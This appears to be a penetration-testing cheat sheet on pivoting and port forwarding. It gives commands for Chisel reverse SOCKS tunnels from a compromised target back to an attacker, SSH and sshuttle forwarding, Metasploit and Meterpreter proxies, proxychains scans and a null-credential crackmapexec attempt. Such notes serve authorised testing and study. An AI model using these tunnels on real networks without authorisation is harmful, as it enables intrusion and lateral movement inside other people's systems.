# Pivoting and Portforwarding

## Chisel

### Install

```bash
# Clone Repository
git clone 'https://github.com/jpillora/chisel.git'

# Build Binary
go build

# Binary is now built and ready to be transfered over to target system.
```

### Reverse SOCKS proxy

```bash
# Attacking Machine
./chisel server -p <Port> --reverse &
./chisel server -p 1337 --reverse &

# On Target Machine
./chisel client <Attacking-IP>:<Port> R:socks &
./chisel client 10.50.46.8:1337 R:socks &

# Then use Proxychains to scan internal networks from the compromised host.
```

## Shuttle

```bash
# Authenticate with password
sshuttle -r <User>@<Target-IP> <Target-Subnet> -x <Target-IP>
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5

# Authenticate with key.
sshuttle -r <User>@<IP> --ssh-cmd "<Command>" <Target Subnet> -x <Exclude IP>
sshuttle -r root@10.200.48.200 --ssh-cmd "ssh -i id_rsa" 10.200.48.0/24 -x 10.200.48.200
```

## SSH

```bash
# Forward RDP from internal host to Attacking Machine on port 1337.
ssh -L <LocalHost>:<Port>:<IP-To-Forward-From>:<Port> <User>@<IP>
ssh -L 127.0.0.1:1337:10.200.48.150:3389 root@10.200.48.200 -i id_rsa

# Forward remote port 80 to local port 80.
ssh atena@10.10.72.69 -L 80:127.0.0.1:80
ssh <User>@<IP> -L <Local-Port>127.0.0.1<Remote-Port>

# Dynamic SSH Port Forwarding
ssh -i <id_rsa> <User>@<IP> -D <Proxychains-Port>
ssh -i id_rsa errorcauser@10.10.254.201 -D 1080
```

## Metasploit with Proxychains

Change last line in `/etc/proxychains4.conf` to the following value: `socks5 127.0.0.1 1080`

Then use the following Metasploit module:

```bash
use auxiliary/server/socks_proxy
```

Set module options to the following (Default):

```c
Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The address to listen on
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)
```

We can then force applications to use proxychains by initiating commands with the command `proxychains` first.

```bash
proxychains nmap <IP> -sT -p 1-10000 -sV -v
proxychains crackmapexec smb 10.10.10.100.5 -u '' -p ''
proxychains ssh <user>@<IP>
proxychains telnet <IP>
```

### Double Pivot

```bash
# /etc/proxychains.conf
# Ensure dynamic_chain is uncommented

dynamic_chain
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000
socks5  127.0.0.1 1080  # First Pivot
socks5  127.0.0.1 1081  # Second Pivot
```

## Port Forward

Meterpreter can be used to portforward for access to file shares and web servers.

```bash
portfwd add -l <LocalPort> -p <RemotePort> -r <TargetIP>
portfwd add -l 3333 -p 3389 -r 10.10.10.5
```

Essentially as per the example command above we could connect to RDP on our local port in order to hit the remote port.

```bash
rdesktop 127.0.0.1:3333
```

## xFreeRDP

Whilst not a direct pivoting technique, using `xFreeRDP` to share the hosts file system can give the attacker an easy route for moving files across systems to further assist with pivoting

```bash
xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
```

![](<../.gitbook/assets/image (1861).png>)

## Tools

Chisel: [https://github.com/jpillora/chisel/releases/tag/v1.7.6](https://github.com/jpillora/chisel/releases/tag/v1.7.6)

## References

{% embed url="https://pentest.blog/explore-hidden-networks-with-double-pivoting/" %}
